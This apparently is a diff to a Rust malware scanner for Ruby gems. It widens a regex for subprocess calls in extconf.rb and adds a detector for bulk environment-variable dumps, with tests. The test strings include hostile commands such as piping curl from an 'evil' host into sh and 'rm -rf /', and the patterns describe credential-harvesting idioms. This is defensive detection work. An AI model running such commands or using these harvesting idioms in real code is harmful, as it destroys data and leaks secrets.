@@ -84,17 +84,27 @@ pub const POPULAR_RUBY_GEMS: &[&str] = &[
 /// ones. Benign `extconf.rb` files only call `mkmf` helpers
 /// (`create_makefile`, `have_header`, ...), which this does not match.
 pub fn extconf_subprocess_regex() -> Regex {
+    // Ruby allows BOTH parenthesized (`system("cmd")`) and paren-less
+    // (`system "cmd"`) calls. The argument suffix `(?: \( | \s+ ARG )` matches
+    // either an opening paren OR whitespace followed by a command argument: a
+    // string literal (`"`/`'`), a `%`-literal start, or an identifier/variable
+    // (`[A-Za-z_$@]`). Requiring an actual argument is what keeps the bare word
+    // "system" in prose/comments from firing, and the leading `\b` (plus the
+    // method names being whole-word) keeps `subsystem` from matching.
     Regex::new(
         r#"(?x)
         (?:
             ` [^`]* `                                |   # backtick command
-            \b system \s* \(                         |
-            \b exec \s* \(                            |
-            \b spawn \s* \(                           |
-            \b Kernel\.(?:system|exec|spawn) \s* \(   |
             %x \s* [\(\{\[\|/!]                       |   # %x(...) / %x{...} (no \b: `%` is non-word, breaks the boundary)
-            \b IO\.popen \s* \(                       |
-            \b Open3\. (?:popen3|popen2|capture2|capture3|capture2e) \s* \(
+            (?:
+                \b system                             |
+                \b exec                               |
+                \b spawn                              |
+                \b Kernel\.(?:system|exec|spawn)      |
+                \b IO\.popen                          |
+                \b Open3\.(?:popen3|popen2|capture2|capture3|capture2e)
+            )
+            (?: \s* \( | \s+ ['"%A-Za-z_$@] )            # `(args)` OR paren-less ` "cmd"` / ` var`
         )
         "#,
     )
@@ -134,6 +144,27 @@ pub fn env_credential_read_regex() -> Regex {
         ['"] [^'"]*
         (?: SECRET | TOKEN | API[_-]?KEY | ACCESS[_-]?KEY | PASSWORD | PASSWD | CREDENTIAL | PRIVATE[_-]?KEY )
         [^'"]* ['"]
+        "#,
+    )
+    .unwrap()
+}
+
+/// BULK environment dumps: a gem that harvests the ENTIRE environment block
+/// (not just one credential-shaped name) and exfiltrates it. The harvester
+/// `ENV['AWS_SECRET_ACCESS_KEY']` form is caught by
+/// [`env_credential_read_regex`]; this companion catches `ENV.to_h`,
+/// `ENV.each`, `ENV.select`, `ENV.map`, `ENV.values`, `ENV.keys`, `ENV.to_a`,
+/// `ENV.entries`, `ENV.filter`, and `ENV.find` — idioms that read every
+/// variable at once, sweeping up credentials without naming them. A benign
+/// single read like `ENV['HOME']` does NOT match (it is a `[`/`fetch` indexed
+/// access, not a whole-map enumeration).
+pub fn env_bulk_read_regex() -> Regex {
+    Regex::new(
+        r#"(?x)
+        \b ENV \s* \.
+        (?: to_h | to_a | to_hash | each(?:_pair)? | select | map | values | keys
+          | entries | filter | find | reject | collect | sort | inject | reduce )
+        \b
         "#,
     )
     .unwrap()
@@ -181,6 +212,34 @@ mod tests {
     }
 
     #[test]
+    fn subprocess_fires_on_parenless_calls() {
+        // Ruby allows paren-less method calls; these MUST fire.
+        let re = extconf_subprocess_regex();
+        assert!(re.is_match(r#"system "curl http://evil | sh""#));
+        assert!(re.is_match(r#"exec "rm -rf /""#));
+        assert!(re.is_match(r#"spawn "sh", "-c", payload"#));
+        assert!(re.is_match(r#"IO.popen "cmd""#));
+        assert!(re.is_match("exec 'rm -rf /'"));
+        assert!(re.is_match("system payload")); // paren-less with a variable arg
+        assert!(re.is_match("Kernel.system \"id\""));
+        assert!(re.is_match("Open3.capture2 \"sh\", \"-c\", cmd"));
+    }
+
+    #[test]
+    fn subprocess_does_not_over_match_identifiers_or_prose() {
+        let re = extconf_subprocess_regex();
+        // `subsystem`/`ecosystem` contain "system" but have no word boundary
+        // before it, so they must not match.
+        assert!(!re.is_match("subsystem_check"));
+        assert!(!re.is_match("the ecosystem is healthy"));
+        assert!(!re.is_match("filesystem_root = '/'"));
+        // The bare word with no command argument (end of line / punctuation)
+        // must not fire.
+        assert!(!re.is_match("# this calls system\n"));
+        assert!(!re.is_match("operating system."));
+    }
+
+    #[test]
     fn benign_extconf_does_not_fire() {
         let benign = r#"
             require 'mkmf'
@@ -210,6 +269,26 @@ mod tests {
         // benign env reads must not fire
         assert!(!re.is_match("ENV['HOME']"));
         assert!(!re.is_match("ENV['PATH']"));
+        assert!(!re.is_match("ENV['RAILS_ENV']"));
+    }
+
+    #[test]
+    fn env_bulk_read_fires_on_whole_env_dumps() {
+        let re = env_bulk_read_regex();
+        // Bulk dump idioms that sweep up every variable.
+        assert!(re.is_match("payload = ENV.to_h"));
+        assert!(re.is_match("ENV.each { |k, v| send(k, v) }"));
+        assert!(re.is_match("ENV.each_pair { |k, v| buf << v }"));
+        assert!(re.is_match("data = ENV.select { |k, _| true }"));
+        assert!(re.is_match("ENV.map { |k, v| \"#{k}=#{v}\" }"));
+        assert!(re.is_match("vals = ENV.values"));
+        assert!(re.is_match("keys = ENV.keys"));
+        assert!(re.is_match("arr = ENV.to_a"));
+        assert!(re.is_match("ENV.entries"));
+        assert!(re.is_match("ENV.filter { |k, _| k.include?('KEY') }"));
+        // Benign single indexed reads must NOT fire as a bulk dump.
+        assert!(!re.is_match("ENV['HOME']"));
+        assert!(!re.is_match("ENV.fetch('PATH')"));
         assert!(!re.is_match("ENV['RAILS_ENV']"));
     }
 
